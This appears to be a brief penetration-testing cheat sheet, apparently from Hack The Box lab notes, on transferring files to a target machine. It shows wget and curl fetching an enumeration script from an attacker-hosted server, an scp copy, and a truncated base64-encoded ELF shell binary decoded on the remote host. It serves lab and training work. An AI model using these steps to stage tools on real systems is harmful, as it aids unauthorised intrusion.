# Transferring Files

## wget

```bash
python3 -m http.server 8000 # on kali machine
wget http://10.10.14.1:8000/linenum.sh # on target machine
```

## cURL

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

## SCP

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh # with ssh user creds
```

## Base64

```bash
lojique@htb[/htb]$ base64 shell -w 0
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

\
